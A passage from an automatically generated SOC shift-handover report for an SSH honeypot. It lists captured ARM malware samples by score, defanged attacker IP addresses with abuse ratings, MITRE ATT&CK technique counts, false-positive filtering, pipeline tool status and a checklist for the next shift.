| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.93.37[.]178` | IN | Ngc Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `121.179.93[.]147` | KR | Jeonnambonbujang | **100** ⚠️ | 50 |
| `115.190.211[.]57` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 8 |
| `112.120.171[.]95` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `14.29.170[.]54` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `103.229.125[.]106` | HK | Cloudie Limited | **100** ⚠️ | 50 |
| `112.120.115[.]152` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 44 |
| `36.64.211[.]93` | ID | PT TELKOM INDONESIA Menara Multimedia Lt.7 Jl. Kebon sirih No.12 JAKARTA | **100** ⚠️ | 50 |
| `154.146.238[.]122` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 294 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 161 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 83 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 42 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 42 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 350 cases |
| Tool 34  | Credential Extractor        | ✅ 244 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 50 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (3.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 83 priority case(s) shown individually · 37 recon entry/entries in table (13 group(s) consolidating 230 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-11T20:27:47Z_
